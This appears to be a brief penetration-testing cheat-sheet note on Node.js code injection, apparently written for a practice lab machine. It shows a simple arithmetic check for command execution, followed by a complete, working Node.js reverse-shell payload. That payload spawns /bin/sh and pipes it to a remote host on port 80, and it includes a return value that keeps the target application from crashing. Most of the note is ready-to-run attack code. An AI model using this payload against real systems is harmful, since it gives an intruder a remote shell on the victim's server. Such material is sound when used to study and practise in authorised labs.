# NodeJS
--------

Check the box Dibble - PGP

Checking for command execution on a Node JS application
```bash
50 + 2 #the output should return 52
```

Reverse shell using Node JS function:
https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
```txt
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "192.168.49.158", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
